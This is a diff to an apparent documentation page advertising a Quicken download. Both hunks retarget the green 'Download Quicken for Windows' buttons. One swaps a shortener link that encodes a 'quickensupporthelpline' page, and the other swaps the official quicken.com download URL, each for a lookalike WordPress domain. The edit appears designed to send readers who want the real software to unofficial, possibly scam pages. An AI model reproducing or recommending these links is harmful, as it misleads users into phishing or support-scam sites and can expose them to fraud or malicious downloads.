@@ -6,7 +6,7 @@ If you're ready to `download Quicken <https://www.quicken.com/download>`_ and in
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2Vuc3VwcG9ydGhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Quicken for Windows
         </a>
     </div>
@@ -146,7 +146,7 @@ Whether you're budgeting, planning retirement, or managing investments — Quick
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.quicken.com/download" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Quicken for Windows
         </a>
     </div>
